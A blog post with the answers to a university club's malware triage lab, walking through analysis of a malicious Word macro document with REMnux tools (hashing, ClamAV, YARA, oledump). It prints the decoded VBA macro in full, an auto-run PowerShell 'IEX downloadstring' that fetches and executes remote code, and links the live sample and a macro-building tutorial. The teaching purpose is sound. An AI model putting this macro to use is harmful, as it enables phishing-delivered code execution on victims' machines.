---
layout: default
---

UW Gray Hats Presentation and Workshop - 2019/03/01
==================================

A big thank you to the UW Gray Hats Cybersecurity Club for inviting me on campus to present my [Malware Triage Workshop](https://drive.google.com/file/d/1NcKC3OEHoNdFBMVwWoqOKifNaXC4Fd_D/preview)!

This post contains the answers to the malware lab section of the workshop. I generated the macro with code from this [Null-bytes article](https://null-byte.wonderhowto.com/how-to/create-obfuscate-virus-inside-microsoft-word-document-0167780/). The lab shows analysts how to triage a basic malicious word document with an embedded macro, a tactic commonly used by cyber criminals. This type of malware is typically delivered through phishing. Never open an office document that contains a macro from someone you don’t know!

The Evil.docm can be downloaded from [here](https://www.dropbox.com/s/hn45veqq1n3udo8/Evil.zip?dl=0).

Password: "infected"
```
$ unzip Evil.zip
```

#### Determine the file type:
```
$ file Evil.docm
Evil.docm: Microsoft Word 2007+
```
_Note: .docm indicates that the document contains macros._
```
$ xxd Evil.docm | head
0000000: 504b 0304 1400 0600 0800 0000 2100 04d9  PK..........!...
0000010: 8a77 9d01 0000 3106 0000 1300 0802 5b43  .w....1.......[C
0000020: 6f6e 7465 6e74 5f54 7970 6573 5d2e 786d  ontent_Types].xm
0000030: 6c20 a204 0228 a000 0200 0000 0000 0000  l ...(..........
0000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
```
_Note: PK is our magic number. Look [here](https://www.garykessler.net/library/file_sigs.html) for "PK", or '50 4B 03 04". 
Notice that PK could indicate a number of different file types._

#### Generate Hashes:
```
$ openssl dgst -md5 Evil.docm
MD5(Evil.docm)= a102976763e24de9871be806a0f18ba1

$ openssl dgst -sha1 Evil.docm
SHA1(Evil.docm)= 40adac8fe197a9c3cf3ab965ad897cfd45e14c4e

$ openssl dgst -sha256 Evil.docm
SHA256(Evil.docm)= c015ddedb10e9842f01dfc906f14e540de821383d18c1bca9cb5eeb784089243

$ ssdeep Evil.docm 
ssdeep,1.1--blocksize:hash:hash,filename
384:Xsz8ND1UU6EsoUg7mJGxmpzSN+2cdc4TlOdeoiG:XD8UIoUyuGxmp0fLdiG,"/home/remnux/Downloads/Evil.docm"
```

#### Research Hashes:
```
$ python Automater.py a102976763e24de9871be806a0f18ba1

____________________     Results found for: a102976763e24de9871be806a0f18ba1     ____________________
[+] MD5 found on VT: No results found
[+] Scan date submitted: No results found
[+] Detected Engines: No results found
[+] Total Engines: No results found
[+] Vendor | Classification: No results found
[+] Hash found at ThreatExpert: No results found
[+] Malicious Indicators from ThreatExpert: No results found
[+] Date found at VXVault: No results found
[+] URL found at VXVault: No results found
[+] Malc0de Date: No results found
[+] Malc0de IP: No results found
[+] Malc0de Country: No results found
[+] Malc0de ASN: No results found
[+] Malc0de ASN Name: No results found
[+] Malc0de MD5: No results found

$ python Automater.py 40adac8fe197a9c3cf3ab965ad897cfd45e14c4e

____________________     Results found for: 40adac8fe197a9c3cf3ab965ad897cfd45e14c4e     ____________________
[+] MD5 found on VT: No results found
[+] Scan date submitted: No results found
[+] Detected Engines: No results found
[+] Total Engines: No results found
[+] Vendor | Classification: No results found
[+] Hash found at ThreatExpert: No results found
[+] Malicious Indicators from ThreatExpert: No results found
[+] Date found at VXVault: No results found
[+] URL found at VXVault: No results found
[+] Malc0de Date: No results found
[+] Malc0de IP: No results found
[+] Malc0de Country: No results found
[+] Malc0de ASN: No results found
[+] Malc0de ASN Name: No results found
[+] Malc0de MD5: No results found
No results found in the THMD5
```
_Note: T/s Automater:_
```
$ sudo vi /usr/lib/python2.7/dist-packages/requests/compat.py
/order replace w/ collections
```
#### Scan with AV:
```
$ freshclam

$ clamscan -ir Evil.docm 
Evil.docm: Doc.Downloader.Generic-6680573-0 FOUND

----------- SCAN SUMMARY -----------
Known viruses: 6781124
Engine version: 0.98.7
Scanned directories: 0
Scanned files: 1
Infected files: 1
Data scanned: 0.00 MB
Data read: 0.02 MB (ratio 0.00:1)
Time: 13.893 sec (0 m 13 s)
```
#### Unpack AV Signatures:
```
$ locate daily.cvd
/var/lib/clamav/daily.cvd

$ cp /var/lib/clamav/daily.cvd ~/Downloads/

$ sigtool -u daily.cvd 

$ locate main.cvd
/var/lib/clamav/main.cvd

$ cp /var/lib/clamav/main.cvd ~/Downloads/

$ sigtool -u main.cvd
```
#### Determine what’s in the AV signature:
```
$ grep 'Doc.Downloader.Generic-6680573-0' *
daily.ldb:Doc.Downloader.Generic-6680573-0;Engine:51-255,Target:2;0&1&2&3;0:4174747269627574652056425f4e616d65203d2022;22706f7765727368656c6c2e657865;28286e65772d6f626a656374;286578656329

$ echo '4174747269627574652056425f4e616d65203d2022' | xxd -r -p
Attribute VB_Name = "

$ echo '22706f7765727368656c6c2e657865' | xxd -r -p
"powershell.exe

$ echo '28286e65772d6f626a656374' | xxd -r -p
((new-object

$ echo '286578656329' | xxd -r -p
(exec)
```
#### Scan with Yara:
```
$ yara -gms /opt/remnux-rules/yara/Malicious_Documents/Maldoc_VBA_macro_code.yar Evil.docm 
Contains_VBA_macro_code [] [author="evild3ad",description="Detect a MS Office document with embedded VBA macro code",date="2016-01-09",filetype="Office documents"] Evil.docm
0x0:$zipmagic: PK
0xc7a:$xmlstr1: vbaProject.bin
0xd6f:$xmlstr1: vbaProject.bin
0x41ca:$xmlstr1: vbaProject.bin
0x4210:$xmlstr1: vbaProject.bin
0x2604:$xmlstr2: vbaData.xml
0x42d3:$xmlstr2: vbaData.xml
```
#### Look for strings:
<details>
<summary>$ strings Evil.docm</summary>
<br>
[Content_Types].xml 
$.g'_
`9K>
_rels/.rels 
jH[{
l0/%
word/_rels/document.xml.rels 
?@SK
word/document.xml
)~$%
+/&G
rln9#Z
}Tt5j
\**@
~DD`u&
i]/e
`5Uwy
xW@DPC
v;Z/
*)4Z
|g#0
=t9w#
M\0A
f_'^
word/_rels/vbaProject.bin.relsl
PJ9_
1tihG
-\Ya;>>
)I-,
$*3W
word/vbaProject.bin
8NpB
'6NZ
J^'J$
}L;S
E:d/
!b_"
^@!s.i\
?CY0
~!Y\
XW^U&
~\KO
XoVK)Y
xBpe(
x9Ez
Jg3j^
j's1L[
)ICt
G76$
#yc8
ObF&
xY_l
F~u1
_2}0
Ht\5
-(F=/
NEK7
w<2	
X]va
h9mHT
LW<l
'Qjv
VWMpgv
Zu9)5r
UlX-
s'pjL
T[?67
K	qR
	[|bw
.Y5XT
|3=qoh
=Q^&>r
o+zF
t24Q(hE
PA=q*C
U1N+_
Ly:N;
+:].
>5[`?U
DW2"
word/theme/theme1.xml
I[4i
X6C~
0p	I
kPFpq
>`pj
s'g\d&
&r>`
k|uY
L,	:
"a,7
g%Lw
3cqo
:QL1/
]_Mf
mZmj
Edy#,
word/settings.xml
bSsf
X)xA
gJ`Jm
#`?d[
ITh,
=LO]>w
a$IR
iz'g
%8 Pk+(
6Omz
O%|$
R/K[
y(a9
$+yq
y4Z6S
GC7u
O4Lf
word/vbaData.xml
c #>
Y{"U
e8Ly
IWBrL
Tj'Znp.
3/W\R
{Z3.
;26'
dO05ulw
customXml/item1.xml 
b9{C
)(*gZ
=@$q
_RC'~
docProps/core.xml 
HVr!7)
y)!E5
bVjx
SKq#
`D'%g
\mh+
jRE-
lw<$.f
3zz^
docProps/app.xml 
!jgW
1f$a
qJmK
U){=
I[<_
word/webSettings.xml
Bk"15i
I?`|
word/styles.xml
D>;q
JC2M
R$b4
7bUf
UAGoU
O?Fs<
8bIbx
R{Z$
tP)2
ee:%
K6c
dPXwhV
|x[U
3<1p4
[4*s
|fRN
-3.>
`5dy
~faT
RD{k
ckG8
N~Jo_
Y8e9
CF+H	
bTHA
nQ{N
!*Lj80b
+5$`
 KFK
h~B_
Za?*Lj\
+5.[
$5.[
.5.[
eKmR
+5.[
eKw&D
CZuM
customXml/itemProps1.xml 
7rx}
$mQn
g!p{()nK
aJi9
t?9z
customXml/_rels/item1.xml.rels 
K)t;J
GILc
H9X)c
word/fontTable.xml
kgeMO
BeDM
L7J(,
PYn0
tVaP
WAtg
EE$N:
WN<+#
#>qg;
]xuB
[Content_Types].xmlPK
_rels/.relsPK
word/_rels/document.xml.relsPK
word/document.xmlPK
word/_rels/vbaProject.bin.relsPK
word/vbaProject.binPK
word/theme/theme1.xmlPK
word/settings.xmlPK
word/vbaData.xmlPK
customXml/item1.xmlPK
docProps/core.xmlPK
docProps/app.xmlPK
word/webSettings.xmlPK
word/styles.xmlPK
customXml/itemProps1.xmlPK
t?9z
customXml/_rels/item1.xml.relsPK
word/fontTable.xmlPK

</details>
  
#### Find the macro:
```
$ python /opt/remnux-scripts/officeparser.py Evil.docm
WARNING: last sector has invalid size
```
_Note: Try another tool!_
```
$ python /opt/remnux-didier/oledump.py Evil.docm
A: word/vbaProject.bin
 A1:       413 'PROJECT'
 A2:        71 'PROJECTwm'
 A3: M    1842 'VBA/NewMacros'
 A4: m    1095 'VBA/ThisDocument'
 A5:      3204 'VBA/_VBA_PROJECT'
 A6:       762 'VBA/dir'
```
_Note: Take note of the stream numbers '3' & '4'. The "letter M next to the index is an indicator for the presence of VBA code. A lowercase letter m indicates VBA code with only Attribute statements, an uppercase letter M indicates more sophisticated VBA code, i.e. code with other statement types than Attribute statements." [4](https://isc.sans.edu/diary/oledump+analysis+of+Rocket+Kitten+-+Guest+Diary+by+Didier+Stevens/19137) The capital M is the stream we should look closely at._

_Side Note: Word/Excel/PPT docs are actually zipped xml documents._
```
$ zipinfo Evil.docm 
Archive:  Evil.docm
Zip file size: 17667 bytes, number of entries: 17
-rw----     4.5 fat     1585 b- defS 80-Jan-01 00:00 [Content_Types].xml
-rw----     4.5 fat      590 b- defS 80-Jan-01 00:00 _rels/.rels
-rw----     4.5 fat     1081 b- defS 80-Jan-01 00:00 word/_rels/document.xml.rels
-rw----     4.5 fat     2606 b- defS 80-Jan-01 00:00 word/document.xml
-rw----     4.5 fat      277 b- defS 80-Jan-01 00:00 word/_rels/vbaProject.bin.rels
-rw----     4.5 fat    10240 b- defS 80-Jan-01 00:00 word/vbaProject.bin
-rw----     4.5 fat     6797 b- defS 80-Jan-01 00:00 word/theme/theme1.xml
-rw----     4.5 fat     3058 b- defS 80-Jan-01 00:00 word/settings.xml
-rw----     4.5 fat     2570 b- defS 80-Jan-01 00:00 word/vbaData.xml
-rw----     4.5 fat      252 b- defS 80-Jan-01 00:00 customXml/item1.xml
-rw----     4.5 fat      755 b- defS 80-Jan-01 00:00 docProps/core.xml
-rw----     4.5 fat      709 b- defS 80-Jan-01 00:00 docProps/app.xml
-rw----     4.5 fat      655 b- defS 80-Jan-01 00:00 word/webSettings.xml
-rw----     4.5 fat    28900 b- defS 80-Jan-01 00:00 word/styles.xml
-rw----     4.5 fat      341 b- defS 80-Jan-01 00:00 customXml/itemProps1.xml
-rw----     4.5 fat      296 b- defS 80-Jan-01 00:00 customXml/_rels/item1.xml.rels
-rw----     4.5 fat     1419 b- defS 80-Jan-01 00:00 word/fontTable.xml
17 files, 62131 bytes uncompressed, 13503 bytes compressed:  78.3%
```
#### Dump the macro and translate to readable format:
```
$ oledump.py -s 3 Evil.docm 
00000000: 01 16 03 00 00 F4 00 00  00 A6 03 00 00 D8 00 00  ................
00000010: 00 B4 01 00 00 FF FF FF  FF AD 03 00 00 7D 05 00  .............}..
00000020: 00 0F 06 00 00 00 00 00  00 01 00 00 00 D9 D5 7C  ...............|
00000030: 1A 00 00 FF FF 03 00 00  00 00 00 00 00 B6 00 FF  ................
00000040: FF 01 01 00 00 00 00 FF  FF FF FF 00 00 00 00 FF  ................
00000050: FF FF FF FF FF 00 00 00  00 00 00 00 00 00 00 00  ................
00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000080: 00 00 00 00 00 00 00 00  00 00 00 10 00 00 00 03  ................
00000090: 00 00 00 05 00 00 00 07  00 00 00 FF FF FF FF FF  ................
000000A0: FF FF FF 01 01 08 00 00  00 FF FF FF FF 78 00 00  .............x..
000000B0: 00 02 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000D0: 00 00 FF FF 00 00 00 00  4D 45 00 00 FF FF FF FF  ........ME......
000000E0: FF FF 00 00 00 00 FF FF  00 00 00 00 FF FF 01 01  ................
000000F0: 00 00 00 00 DF 00 FF FF  00 00 00 00 00 00 FF FF  ................
00000100: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000110: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000120: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000130: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000140: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000150: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000160: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000170: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF 28 00  ..............(.
00000180: 00 00 00 00 02 3C 08 00  FF FF 00 00 00 00 02 3C  .....<.........<
00000190: 10 00 FF FF 00 00 00 00  02 3C 18 00 FF FF 00 00  .........<......
000001A0: 00 00 02 3C FF FF FF FF  00 00 FF FF 01 01 00 00  ...<............
000001B0: 00 00 00 00 00 00 00 00  00 00 98 00 00 00 01 01  ................
000001C0: 60 01 00 00 40 00 00 00  FF FF FF FF 02 83 32 02  `...@.........2.
000001D0: FF FF FF FF 00 00 00 00  FF FF FF FF 38 00 00 00  ............8...
000001E0: 00 00 FF FF FF FF FF FF  00 00 00 00 FF FF FF FF  ................
000001F0: FF FF FF FF 00 00 00 00  00 00 00 00 1D 00 00 00  ................
00000200: 25 00 00 00 0B 12 34 02  B8 00 00 00 FF FF FF FF  %.....4.........
00000210: 00 00 00 00 FF FF FF FF  FF FF FF FF 00 00 00 00  ................
00000220: 00 00 00 00 00 00 00 00  00 00 00 00 FF FF FF FF  ................
00000230: 00 00 00 00 00 00 00 00  00 00 00 00 FF FF FF FF  ................
00000240: FF FF FF FF FF FF FF FF  05 00 00 00 00 00 84 00  ................
00000250: 00 02 00 00 FF FF FF FF  68 00 00 00 FF FF FF FF  ........h.......
00000260: 00 00 00 00 60 84 36 02  FF FF FF FF FF FF FF FF  ....`.6.........
00000270: FF FF FF FF 08 00 FF FF  00 00 00 00 0B 12 3A 02  ..............:.
00000280: 08 01 00 00 FF FF FF FF  00 00 00 00 FF FF FF FF  ................
00000290: FF FF FF FF 00 00 00 00  00 00 00 00 00 00 00 00  ................
000002A0: 00 00 00 00 FF FF FF FF  00 00 00 00 00 00 00 00  ................
000002B0: 00 00 00 00 FF FF FF FF  FF FF FF FF FF FF FF FF  ................
000002C0: 03 00 00 00 00 00 84 00  00 02 FF FF 0B 12 3C 02  ..............<.
000002D0: FF FF FF FF FF FF FF FF  00 00 00 00 FF FF FF FF  ................
000002E0: FF FF FF FF 00 00 00 00  00 00 00 00 00 00 00 00  ................
000002F0: 00 00 00 00 FF FF FF FF  00 00 00 00 00 00 00 00  ................
00000300: 00 00 00 00 FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000310: 03 00 00 00 00 00 84 00  00 02 00 00 FF FF FF FF  ................
00000320: 00 01 00 00 03 00 01 00  00 00 00 00 00 00 00 00  ................
00000330: 00 00 00 00 40 00 00 00  FF FF FF FF FF FF FF FF  ....@...........
00000340: FF FF FF FF FF FF FF FF  FF FF FF FF 08 01 00 00  ................
00000350: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000360: FF FF FF FF FF FF FF FF  FF FF FF FF 08 00 00 00  ................
00000370: 00 00 00 00 00 00 00 00  10 00 00 00 08 00 FF FF  ................
00000380: FF FF 00 00 00 00 FF FF  FF FF FF FF FF FF FF FF  ................
00000390: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF 00 00  ................
000003A0: 02 00 FF FF FF FF 00 00  00 00 00 00 DF 00 00 00  ................
000003B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000003C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000003D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000003E0: 00 00 00 00 00 00 00 00  00 FE CA 01 00 0B 00 22  ..............."
000003F0: 81 08 00 06 00 00 00 00  00 00 00 00 80 08 04 08  ............�...
00000400: 00 00 00 08 00 00 00 00  81 08 04 98 00 00 00 60  ...............`
00000410: 00 00 00 00 81 08 04 0C  00 00 00 10 00 00 00 04  ................
00000420: 81 08 00 02 00 00 00 20  00 00 00 22 81 08 00 06  ....... ..."....
00000430: 00 00 00 28 00 00 00 00  81 08 04 06 00 00 00 30  ...(...........0
00000440: 00 00 00 04 81 08 00 02  00 00 00 38 00 00 00 22  ...........8..."
00000450: 81 08 00 06 00 00 00 48  00 00 00 00 81 08 04 06  .......H........
00000460: 00 00 00 50 00 00 00 04  81 08 00 02 00 00 00 58  ...P...........X
00000470: 00 00 00 FF FF FF FF 01  01 00 01 00 00 96 04 40  ...............@
00000480: 00 00 00 00 00 5D 00 F5  04 A0 00 00 00 20 00 36  .....]....... .6
00000490: 02 1D 00 41 40 38 02 01  00 10 00 00 00 6F 00 FF  ...A@8.......o..
000004A0: FF 18 00 00 00 96 04 B8  00 00 00 00 00 41 40 34  .............A@4
000004B0: 02 00 00 00 00 6F 00 FF  FF 00 00 00 00 FF FF FF  .....o..........
000004C0: FF 38 00 00 00 96 04 08  01 00 00 00 00 41 40 34  .8...........A@4
000004D0: 02 00 00 00 00 6F 00 FF  FF 98 00 00 00 B9 00 90  .....o..........
000004E0: 00 70 6F 77 65 72 73 68  65 6C 6C 2E 65 78 65 20  .powershell.exe 
000004F0: 22 49 45 58 20 28 28 6E  65 77 2D 6F 62 6A 65 63  "IEX ((new-objec
00000500: 74 20 6E 65 74 2E 77 65  62 63 6C 69 65 6E 74 29  t net.webclient)
00000510: 2E 64 6F 77 6E 6C 6F 61  64 73 74 72 69 6E 67 28  .downloadstring(
00000520: 27 68 74 74 70 73 3A 2F  2F 6F 72 69 67 30 33 2E  'https://orig03.
00000530: 64 65 76 69 61 6E 74 61  72 74 2E 6E 65 74 2F 31  deviantart.net/1
00000540: 32 36 66 2F 66 2F 32 30  30 39 2F 31 35 36 2F 38  26f/f/2009/156/8
00000550: 2F 35 2F 6F 77 6C 5F 62  65 61 72 5F 62 79 5F 62  /5/owl_bear_by_b
00000560: 65 6E 77 6F 6F 74 74 65  6E 2E 6A 70 67 27 29 29  enwootten.jpg'))
00000570: 22 27 00 36 02 FF FF FF  FF C0 01 00 00 FF FF FF  "'.6............
00000580: FF 01 01 08 00 00 00 FF  FF FF FF 78 00 00 00 FF  ...........x....
00000590: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
000005A0: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
000005B0: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
000005C0: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
000005D0: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
000005E0: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
000005F0: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000600: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000610: FF FF FF 00 00 01 19 B1  00 41 74 74 72 69 62 75  .........Attribu
00000620: 74 00 65 20 56 42 5F 4E  61 6D 00 65 20 3D 20 22  t.e VB_Nam.e = "
00000630: 4E 65 77 00 4D 61 63 72  6F 73 22 0A 00 53 75 62  New.Macros"..Sub
00000640: 20 41 75 74 6F 00 5F 4F  70 65 6E 28 29 0A 02 20   Auto._Open().. 
00000650: 00 00 44 69 6D 20 65 78  80 65 63 20 41 73 20 53  ..Dim ex�ec As S
00000660: 00 7C 1C 6E 67 02 2C 02  24 00 7A 70 6F 77 00 65  .|.ng.,.$.zpow.e
00000670: 72 73 68 65 6C 6C 2E 01  00 24 20 22 22 49 45 58  rshell...$ ""IEX
00000680: 20 00 28 28 6E 65 77 2D  6F 62 00 6A 65 63 74 20   .((new-ob.ject 
00000690: 6E 65 74 00 2E 77 65 62  63 6C 69 65 00 6E 74 29  net..webclie.nt)
000006A0: 2E 64 6F 77 6E 20 6C 6F  61 64 73 02 4B 28 27 00  .down loads.K('.
000006B0: 68 74 74 70 73 3A 2F 2F  00 6F 72 69 67 30 33 2E  https://.orig03.
000006C0: 64 00 65 76 69 61 6E 74  61 72 04 74 2E 00 38 2F  d.eviantar.t..8/
000006D0: 31 32 36 66 00 2F 66 2F  32 30 30 39 2F 00 31 35  126f./f/2009/.15
000006E0: 36 2F 38 2F 35 2F 00 6F  77 6C 5F 62 65 61 72 08  6/8/5/.owl_bear.
000006F0: 5F 62 79 00 07 6E 77 6F  6F 00 74 74 65 6E 2E 6A  _by..nwoo.tten.j
00000700: 70 67 40 27 29 29 22 22  22 02 9F 53 09 01 92 20  pg@'))"""..S... 
00000710: 28 01 A6 29 0A 45 6E 7C  64 20 00 DB 06 DF 08 6F  (..).En|d .....o
00000720: 06 77 0A 12 57 80 6F 72  6B 62 6F 6F 6B 09 84 01  .w..W�orkbook...
00000730: 8F 14                                             ..
```
```
$ oledump.py -s 4 Evil.docm 
00000000: 01 16 03 00 00 F4 00 00  00 B8 02 00 00 D8 00 00  ................
00000010: 00 DE 01 00 00 FF FF FF  FF BF 02 00 00 13 03 00  ................
00000020: 00 A5 03 00 00 00 00 00  00 01 00 00 00 D9 D5 11  ................
00000030: 37 00 00 FF FF A3 01 00  00 88 00 00 00 B6 00 FF  7...............
00000040: FF 01 01 00 00 00 00 FF  FF FF FF 00 00 00 00 FF  ................
00000050: FF FF FF FF FF 00 00 00  00 00 00 00 00 00 00 00  ................
00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000080: 00 00 00 00 00 00 00 00  00 00 00 10 00 00 00 03  ................
00000090: 00 00 00 05 00 00 00 07  00 00 00 FF FF FF FF FF  ................
000000A0: FF FF FF 01 01 08 00 00  00 FF FF FF FF 78 00 00  .............x..
000000B0: 00 08 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000D0: 00 00 FF FF 00 00 00 00  4D 45 00 00 FF FF FF FF  ........ME......
000000E0: FF FF 00 00 00 00 FF FF  00 00 00 00 FF FF 01 01  ................
000000F0: 00 00 00 00 DF 00 FF FF  00 00 00 00 18 00 FF FF  ................
00000100: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000110: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000120: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000130: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000140: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000150: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000160: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000170: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF 28 00  ..............(.
00000180: 00 00 02 00 53 22 FF FF  FF FF 00 00 01 00 53 10  ....S"........S.
00000190: FF FF FF FF 00 00 01 00  53 22 FF FF FF FF 00 00  ........S"......
000001A0: 00 00 02 3C FF FF FF FF  00 00 FF FF 01 01 00 00  ...<............
000001B0: 00 00 01 00 28 00 31 00  4E 00 6F 00 72 00 6D 00  ....(.1.N.o.r.m.
000001C0: 61 00 6C 00 2E 00 54 00  68 00 69 00 73 00 44 00  a.l...T.h.i.s.D.
000001D0: 6F 00 63 00 75 00 6D 00  65 00 6E 00 74 00 08 00  o.c.u.m.e.n.t...
000001E0: 00 00 00 00 FF FF FF FF  01 01 48 00 00 00 02 80  ..........H....�
000001F0: FE FF FF FF FF FF 20 00  00 00 FF FF FF FF 30 00  ...... .......0.
00000200: 00 00 02 01 FF FF 00 00  00 00 00 00 00 00 FF FF  ................
00000210: FF FF FF FF FF FF 00 00  72 64 09 30 78 37 1D 00  ........rd.0x7..
00000220: 00 00 25 00 00 00 FF FF  FF FF 40 00 00 00 FF FF  ..%.......@.....
00000230: FF FF 38 00 00 00 00 00  00 00 00 00 01 00 00 00  ..8.............
00000240: 00 00 00 00 00 00 FF FF  FF FF FF FF FF FF FF FF  ................
00000250: FF FF 00 00 00 00 FF FF  FF FF FF FF FF FF FF FF  ................
00000260: FF FF FF FF FF FF FF FF  FF FF 00 00 00 00 FF FF  ................
00000270: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000280: FF FF 00 00 00 00 00 00  00 00 FF FF 00 00 FF FF  ................
00000290: FF FF FF FF 00 00 00 00  FF FF FF FF FF FF FF FF  ................
000002A0: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
000002B0: 00 00 01 00 FF FF FF FF  00 00 00 00 00 00 DF 00  ................
000002C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000002D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000002E0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000002F0: 00 00 00 00 00 00 00 00  00 00 00 FE CA 01 00 00  ................
00000300: 00 FF FF FF FF 01 01 08  00 00 00 FF FF FF FF 78  ...............x
00000310: 00 00 00 FF FF FF FF 01  01 08 00 00 00 FF FF FF  ................
00000320: FF 78 00 00 00 FF FF FF  FF FF FF FF FF FF FF FF  .x..............
00000330: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000340: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000350: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000360: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000370: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000380: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000390: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
000003A0: FF FF FF FF FF FF FF FF  FF 00 00 01 98 B0 00 41  ...............A
000003B0: 74 74 72 69 62 75 74 00  65 20 56 42 5F 4E 61 6D  ttribut.e VB_Nam
000003C0: 00 65 20 3D 20 22 54 68  69 00 73 44 6F 63 75 6D  .e = "Thi.sDocum
000003D0: 65 6E 88 74 22 0A 0A 88  42 61 73 02 88 00 31 4E  en.t"...Bas...1N
000003E0: 6F 72 6D 61 6C 2E 81 18  A8 47 6C 6F 62 61 6C 01  ormal....Global.
000003F0: A6 10 53 70 61 63 01 6A  46 61 6C 04 73 65 0B 9E  ..Spac.jFal.se..
00000400: 43 72 65 61 74 08 61 62  6C 14 1E 50 72 65 64 90  Creat.abl..Pred.
00000410: 65 63 6C 61 00 06 49 64  00 9A 08 54 72 75 0C 40  ecla..Id...Tru.@
00000420: 45 78 70 6F 04 73 65 13  1B 54 65 6D 70 6C 00 61  Expo.se..Templ.a
00000430: 74 65 44 65 72 69 76 01  14 23 43 75 73 74 6F 6D  teDeriv..#Custom
00000440: 69 06 7A 84 41 02 30                              i.z.A.0
```
_Note: Now we want to decompress the VBA code._
```
$ oledump.py -s 3 -v Evil.docm 
Attribute VB_Name = "NewMacros"
Sub Auto_Open()
    Dim exec As String
    exec = "powershell.exe ""IEX ((new-object net.webclient).downloadstring('https://orig03.deviantart.net/126f/f/2009/156/8/5/owl_bear_by_benwootten.jpg'))"""
    Shell (exec)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub
```
_Note: Here we found our network IOC!_
```
$ oledump.py -s 4 -v Evil.docm 
Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
```
#### Automated Behavioral Analysis
_Note: The VT & Hybrid Analysis reports confirm out previous analysis and provide an IOC list to create additional signatures to detect this threat._
1. [VirusTotal Results](https://www.virustotal.com/#/file/c015ddedb10e9842f01dfc906f14e540de821383d18c1bca9cb5eeb784089243/detection)
2. [Hybrid Analysis](https://www.hybrid-analysis.com/sample/c015ddedb10e9842f01dfc906f14e540de821383d18c1bca9cb5eeb784089243/5c5cf0fb7ca3e148f451fd07)

#### References:
1. REMnux: https://remnux.org/docs/ 
2. Didier Stevens oldedump.py: https://blog.didierstevens.com/programs/oledump-py/
3. How to create a malicious macro: https://null-byte.wonderhowto.com/how-to/create-obfuscate-virus-inside-microsoft-word-document-0167780/
4. Didier Stevens, oledump analysis of Rocket Kitten - Guest Diary by Didier Stevens https://isc.sans.edu/diary/oledump+analysis+of+Rocket+Kitten+-+Guest+Diary+by+Didier+Stevens/19137

[back](./)
